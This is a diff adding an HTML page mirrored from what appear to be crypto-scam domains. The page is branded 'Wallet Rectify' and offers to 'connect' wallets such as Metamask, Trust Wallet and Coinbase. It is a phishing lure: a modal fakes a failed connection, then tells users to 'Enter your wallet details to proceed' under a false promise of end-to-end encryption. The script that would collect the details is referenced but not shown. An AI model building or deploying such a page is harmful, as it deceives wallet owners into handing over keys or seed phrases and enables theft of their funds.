@@ -1,0 +1,481 @@
+<!doctype html>
+<html lang="en">
+    
+
+<!-- Mirrored from smartdappsconnection.com/connect by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Oct 2023 16:49:04 GMT -->
+<!-- Added by HTTrack -->
+<!-- Mirrored from nodesappfix.com/en/connect.html by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 02 Apr 2024 21:50:33 GMT -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" type="image/png" href="assets/img/favicon.png">
+    <title>Wallet Rectify - Rectification, Synchronization, and Validation</title>
+
+    <base />
+
+    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <link href="assets/vendor/icons/icofont.min.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="assets/vendor/bootstrap/font/bootstrap-icons.css">
+
+    <link rel="stylesheet" type="text/css" href="assets/vendor/slick/slick.min.css" />
+    <link rel="stylesheet" type="text/css" href="assets/vendor/slick/slick-theme.min.css" />
+
+    <link href="assets/css/style.css" rel="stylesheet">
+</head>
+
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm p-0 osahan-nav">
+    <div class="container">
+        <a class="navbar-brand" href="index-2.html">
+            <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid">
+        </a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup16" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNavAltMarkup16">
+            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                <li class="nav-item">
+                    <a class="nav-link active" aria-current="page" href="index-2.html">Home - Wallet Rectify</a>
+                </li>
+            </ul>
+
+            <ul class="nav explore-tabs mb-0 justify-content-center gap-2" id="chain-switch-pill" role="tablist">
+                
+                    <li class="nav-item" role="presentation" data-chain-id="0">
+                        <button class="nav-link active" id="pills-all-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-all" aria-selected="true">
+                                                        All                        </button>
+                    </li>
+
+                
+                    <li class="nav-item" role="presentation" data-chain-id="1">
+                        <button class="nav-link " id="pills-ethereum-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-ethereum" aria-selected="true">
+                                                            <span><img src="assets/img/ethereum.png" width="8"></span>&nbsp;
+                                                        Ethereum                        </button>
+                    </li>
+
+                
+                    <li class="nav-item" role="presentation" data-chain-id="2">
+                        <button class="nav-link " id="pills-bsc-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-bsc" aria-selected="true">
+                                                            <span><img src="assets/img/binance.png" width="15"></span>&nbsp;
+                                                        BSC                        </button>
+                    </li>
+
+                
+                    <li class="nav-item" role="presentation" data-chain-id="3">
+                        <button class="nav-link " id="pills-polygon-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-polygon" aria-selected="true">
+                                                            <span><img src="assets/img/polygon.png" width="15"></span>&nbsp;
+                                                        Polygon                        </button>
+                    </li>
+
+                
+                    <li class="nav-item" role="presentation" data-chain-id="4">
+                        <button class="nav-link " id="pills-avalanche-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-avalanche" aria-selected="true">
+                                                            <span><img src="assets/img/avalanche.png" width="15"></span>&nbsp;
+                                                        Avalanche                        </button>
+                    </li>
+
+                
+                    <li class="nav-item" role="presentation" data-chain-id="5">
+                        <button class="nav-link " id="pills-solana-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-solana" aria-selected="true">
+                                                            <span><img src="assets/img/solana.png" width="15"></span>&nbsp;
+                                                        Solana                        </button>
+                    </li>
+
+                
+                    <li class="nav-item" role="presentation" data-chain-id="6">
+                        <button class="nav-link " id="pills-cardano-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-cardano" aria-selected="true">
+                                                            <span><img src="assets/img/cardano.png" width="15"></span>&nbsp;
+                                                        Cardano                        </button>
+                    </li>
+
+                            </ul>
+
+            <div class="navbar-nav ms-auto gap-3 connect_wallet">
+                <a class="btn btn-primary btn-sm" href="connect.html"><i class="bi bi-wallet"></i></span> Connect Wallet</a>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="pt-5 bg-dark ">
+        <div class="container py-4 px-5 text-center">
+            <div class="row gx-5 justify-content-center">
+                <div class="col-lg-8">
+                    <h1 class="text-white display-5 mb-2 fw-bold">Connect your wallet</h1>
+                    <p class="lead text-white-50 m-0">Sign in with one of these available wallet providers<br> or create a
+                        new wallet.
+                    </p>
+                </div>
+            </div>
+        </div>
+        <div class="svg-border-rounded text-light">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144.54 17.34" preserveAspectRatio="none" fill="#f0f2f5">
+                <path d="M144.54,17.34H0V0H144.54ZM0,0S32.36,17.34,72.27,17.34,144.54,0,144.54,0"></path>
+            </svg>
+        </div>
+    </section>
+
+    <section class="py-5">
+        <div class="container py-4">
+            <div class="row justify-content-center">
+                <div class="col-12 col-lg-9">
+                    <ul class="nav help-tabs mb-3 justify-content-center" id="pills-tab" role="tablist">
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-metamask-tab" data-bs-toggle="pill" data-bs-target="#pills-metamask" data-payment-protocol="0" data-wallet-name="Metamask" data-wallet-logo="assets/img/wallets/metamask.png" type="button" role="tab" aria-controls="pills-metamask" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/metamask.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Metamask</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-trust_wallet-tab" data-bs-toggle="pill" data-bs-target="#pills-trust_wallet" data-payment-protocol="1" data-wallet-name="Trust Wallet" data-wallet-logo="assets/img/wallets/trust_wallet.png" type="button" role="tab" aria-controls="pills-trust_wallet" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/trust_wallet.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Trust Wallet</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-coinbase-tab" data-bs-toggle="pill" data-bs-target="#pills-coinbase" data-payment-protocol="2" data-wallet-name="Coinbase" data-wallet-logo="assets/img/wallets/coinbase.png" type="button" role="tab" aria-controls="pills-coinbase" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/coinbase.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Coinbase</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-bitski-tab" data-bs-toggle="pill" data-bs-target="#pills-bitski" data-payment-protocol="3" data-wallet-name="Bitski" data-wallet-logo="assets/img/wallets/bitski.png" type="button" role="tab" aria-controls="pills-bitski" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/bitski.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Bitski</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-venly-tab" data-bs-toggle="pill" data-bs-target="#pills-venly" data-payment-protocol="4" data-wallet-name="Venly" data-wallet-logo="assets/img/wallets/venly.png" type="button" role="tab" aria-controls="pills-venly" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/venly.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Venly</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-yoroi-tab" data-bs-toggle="pill" data-bs-target="#pills-yoroi" data-payment-protocol="5" data-wallet-name="Yoroi" data-wallet-logo="assets/img/wallets/yoroi.png" type="button" role="tab" aria-controls="pills-yoroi" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/yoroi.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Yoroi</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-exodus-tab" data-bs-toggle="pill" data-bs-target="#pills-exodus" data-payment-protocol="6" data-wallet-name="Exodus" data-wallet-logo="assets/img/wallets/exodus.png" type="button" role="tab" aria-controls="pills-exodus" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/exodus.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Exodus</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-nami-tab" data-bs-toggle="pill" data-bs-target="#pills-nami" data-payment-protocol="7" data-wallet-name="Nami" data-wallet-logo="assets/img/wallets/nami.png" type="button" role="tab" aria-controls="pills-nami" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/nami.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Nami</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-eternl-tab" data-bs-toggle="pill" data-bs-target="#pills-eternl" data-payment-protocol="8" data-wallet-name="Eternl" data-wallet-logo="assets/img/wallets/eternl.png" type="button" role="tab" aria-controls="pills-eternl" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/eternl.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">Eternl</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                        
+                            <li class="nav-item" role="presentation">
+                                <button class="payment_protocol_button nav-link shadow-sm" id="pills-walletconnect-tab" data-bs-toggle="pill" data-bs-target="#pills-walletconnect" data-payment-protocol="9" data-wallet-name="WalletConnect" data-wallet-logo="assets/img/wallets/walletconnect.png" type="button" role="tab" aria-controls="pills-walletconnect" aria-selected="true">
+                                    <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+                                        <span class="mb-2">
+                                            <img class=" " src="assets/img/wallets/walletconnect.png" width="50">
+                                        </span>
+                                        <span class="h6 fw-bold">WalletConnect</span>
+                                    </span>
+                                </button>
+                            </li>
+
+                                            </ul>
+                    <div class="d-flex align-items-center justify-content-center mt-4 pt-4">
+                        <div class="text-muted small text-center">We do not own your private keys and cannot access your<br> funds
+                            without your confirmation or approval.
+                        </div>
+                        <!---<div class="ms-3">
+                            <a class="fw-bold btn btn-sm btn-dark disabled" id="connect_wallet_next" href="#">NEXT</a>
+                        </div>--->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="bg-dark  py-4">
+    <div class="container py-4">
+        <div class="row justify-content-center">
+            <div class="col-xl-6 col-lg-7 col-md-8 col-12">
+                <div class="text-center py-4">
+                    <small class="text-white-50">- Wallet Rectify -</small>
+                    <h1 class="fw-bold text-white py-3">We make sure that everyone is able to securely use their wallet</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<footer class="footer bg-white py-5">
+    <div class="container py-4">
+        <div class="row">
+            <div class="col-md-12 col-lg-4 col-12">
+                <div class="row">
+                    <div class="col-3">
+                        <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid" >
+                    </div>
+                    <div class="col-9 mt-2">
+                        <h4>Wallet Rectify</h4>
+                    </div>
+                </div>
+                <div class="text-muted mt-4">
+                    <p class="mb-4">Open and decentralized protocol for syncing various Wallets to Dapps Secure Server. This is not an app but a protocol that establishes a remote connection between two/more apps and/or devices</p>
+                    <p>
+                        Every digital artwork on Upside is authentic and truly unique. Blockchain technology makes this new aproch to digital ownership possible. Open and decentralized protocol for syncing various Wallets issues on Secure Server. It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues.
+                    </p>
+                </div>
+            </div>
+            <div class="col-md-12 col-lg-4 col-12">
+                <script type="text/javascript">
+                    baseUrl = "https://widgets.cryptocompare.com/";
+                    var scripts = document.getElementsByTagName("script");
+                    var embedder = scripts[ scripts.length - 1 ];
+                    (function (){
+                    var appName = "google.com";
+                    var s = document.createElement("script");
+                    s.type = "text/javascript";
+                    s.async = true;
+                    var theUrl = baseUrl+'serve/v1/coin/feed?fsym=BTC&tsym=USD';
+                    s.src = theUrl + ( theUrl.indexOf("?") >= 0 ? "&" : "?") + "app=" + appName;
+                    embedder.parentNode.appendChild(s);
+                    })();
+                </script>
+            </div>
+            <div class="col-md-12 col-lg-4 col-12">
+                <form>
+                    <h6 class="fw-bold text-body mb-2">SUBSCRIBE</h6>
+                    <div class="mb-4 text-muted">Subscribe for the latest news, drops & new features</div>
+                    <div class="input-group">
+                        <input type="text" class="form-control" placeholder="Enter Your Email">
+                        <button class="btn btn-primary" type="button"><i class="bi bi-envelope me-2"></i> Subscribe</button>
+                    </div>
+                    <div class="small mt-3 text-danger">No worries we don't spam! Unsubscribe at any time by <br>clicking on the link in the email.</div>
+                </form>
+            </div>
+        </div>
+    </div>
+</footer>
+<div class="footer-mid py-4">
+    <div class="container">
+        <div class="row align-items-center justify-content-between">
+            <div class="col-auto">
+                <div class="mb-4 mb-md-0">
+                    <a href="index-2.html" class="text-decoration-none link-dark fw-bold pe-2">Home</a>
+                    <a href="#features" class="text-decoration-none link-dark fw-bold px-2">Features</a>
+                </div>
+            </div>
+            <div class="col-auto">
+                <div class="d-flex align-items-center gap-3">
+                    <span class="text-decoration-none link-dark">Download app</span>
+                    <a href="#"><img src="assets/img/app-store.png" alt="#" class="img-fluid"></a>
+                    <a href="#"><img src="assets/img/google-store.png" alt="#" class="img-fluid"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="footer-end bg-white py-4">
+    <div class="container">
+        <div class="row align-items-center justify-content-center">
+            <div class="col-12 text-center">
+                <span class="small">© 2023 Wallet Rectify, All rights reserved.</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="assets/vendor/jquery/jquery.min.js"></script>
+<script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<script  src="assets/vendor/slick/slick.min.js"></script>
+<script src="assets/vendor/qrcodejs/qrcode.min.js"></script>
+
+<script src="assets/js/main.js"></script>
+<script src="assets/js/custom.js"></script>
+
+<script src="assets/js/custom.js"></script>
+<!---<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="ed049cbab6b05fd241416a8e-|49" defer=""></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vaafb692b2aea4879b33c060e79fe94621666317369993" integrity="sha512-0ahDYl866UMhKuYcW078ScMalXqtFJggm7TmlUtp0UlD4eQk0Ixfnm5ykXKvGJNFjLMoortdseTfsRT8oCfgGA==" data-cf-beacon='{"rayId":"77ca4b101e501899","version":"2022.11.3","r":1,"token":"dd471ab1978346bbb991feaa79e6ce5c","si":100}' crossorigin="anonymous"></script>---></body>
+
+<!--- Modal --->
+<div class="modal fade show" id="modalPaymentProtocol" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-modal="true" role="dialog">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content border-0 rounded shadow">
+            <div class="modal-header border-0">
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body px-5">
+                <div class="text-center mb-5">
+                    <img id="selected_wallet_logo" src="#" width="30"/>
+                    <b id="selected_wallet_name" style="font-size: larger; vertical-align: middle;"></b>
+                </div>
+
+                <div class="text-center mb-4 connection_loading">
+                    <div class="spinner-border" role="status" style="font-size: x-large">
+                        <span class="sr-only">Loading...</span>
+                    </div>
+                    <div class="h1 fw-bold">Connecting...</div>
+
+                    <div class="mt-3">Please Wait</div>
+                </div>
+
+                <div class="text-center mb-4 can_not_connect" style="display:none">
+                    <div class="h2 fw-bold text-danger">Connection Failed</div>
+
+                    <div class="alert alert-danger" role="alert">
+                        <i class="bi bi-info-circle text-danger mb-3"></i>
+                        We could not automatically initiate a connection with your selected wallet protocol. A manual connection will be automatically started. Connect your wallet and follow prompt.
+                    </div>
+
+                    <div class="d-grid">
+                        <button type="button" class="btn btn-primary btn_try_connection_again btn-sm shadow-sm">
+                            <i class="bi bi-arrow-clockwise"></i> Try again
+                        </button>
+                    </div>
+
+                    <div class="text-center mt-1"><b class="seconds_count_to_manual">5</b></div>
+                </div>
+
+                <div class="text-center mb-4 waiting_for_connection" style="display:none">
+                    Waiting for confirmation...<br>
+                    Enter your wallet details to proceed.
+
+                    <!---<br><br>Click the button below if your wallet does not open.
+
+                    <button class="btn btn-sm btn-primary">Open Wallet</button>--->
+                </div>
+                
+                <div class="d-flex align-items-center justify-content-between divide my-3">
+                    <hr class="w-100">
+                    <!---<span class="text-muted small px-2">OR</span>--->
+                    <hr class="w-100">
+                </div>
+
+                <div class="text-center">
+                    <div><i class="bi bi-lock" style="color:green;"></i> This connection is protected with an <a href="#" class="text-decoration-none link-priamry fw-bold">end-to-end encryption</a></div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+    .  {
+        filter: gray;
+        /* IE6-9 */
+        -webkit-filter: grayscale(1);
+        /* Google Chrome, Safari 6+ & Opera 15+ */
+        filter: grayscale(1);
+        /* Microsoft Edge and Firefox 35+ */
+    }
+
+    .image_colored {
+        -webkit-filter: grayscale(0);
+        filter: none;
+    }
+
+    .payment_protocol_button.active img {
+        -webkit-filter: grayscale(0);
+        filter: none;
+    }
+</style>
+
+<script>
+    var siteChains  = JSON.parse( JSON.stringify( 
+            [
+                {"name": "All", "code": "all", "img_name": "", "img_width": ""},
+                {"name": "Ethereum", "code": "ethereum", "img_name": "ethereum.png", "img_width": "8"},
+                {"name": "BSC", "code": "bsc", "img_name": "binance.png", "img_width": "15"},
+                {"name": "Polygon", "code": "polygon", "img_name": "polygon.png", "img_width": "15"},
+                {"name": "Avalanche", "code": "avalanche", "img_name": "avalanche.png", "img_width": "15"},
+                {"name": "Solana", "code": "solana", "img_name": "solana.png", "img_width": "15"},
+                {"name": "Cardano", "code": "cardano", "img_name": "cardano.png", "img_width": "15"}
+            ]
+         ) );
+    var sitePaymentProtocols  = JSON.parse( JSON.stringify( 
+        [
+            {"name": "Metamask", "code": "metamask", "img_name": "metamask.png", "img_width": "50"},
+            {"name": "Trust Wallet", "code": "trust_wallet", "img_name": "trust_wallet.png", "img_width": "50"},
+            {"name": "Coinbase", "code": "coinbase", "img_name": "coinbase.png", "img_width": "50"},
+            {"name": "Bitski", "code": "bitski", "img_name": "bitski.png", "img_width": "50"},
+            {"name": "Venly", "code": "venly", "img_name": "venly.png", "img_width": "50"},
+            {"name": "Yoroi", "code": "yoroi", "img_name": "yoroi.png", "img_width": "50"},
+            {"name": "Exodus", "code": "exodus", "img_name": "exodus.png", "img_width": "50"},
+            {"name": "Nami", "code": "nami", "img_name": "nami.png", "img_width": "50"},
+            {"name": "Eternl", "code": "eternl", "img_name": "eternl.png", "img_width": "50"},
+            {"name": "WalletConnect", "code": "walletconnect", "img_name": "walletconnect.png", "img_width": "50"}
+        ]
+     ) );
+</script>
+
+
+<!-- Mirrored from smartdappsconnection.com/connect by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Oct 2023 16:49:12 GMT -->
+
+<!-- Mirrored from nodesappfix.com/en/connect.html by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 02 Apr 2024 21:50:44 GMT -->
+</html>
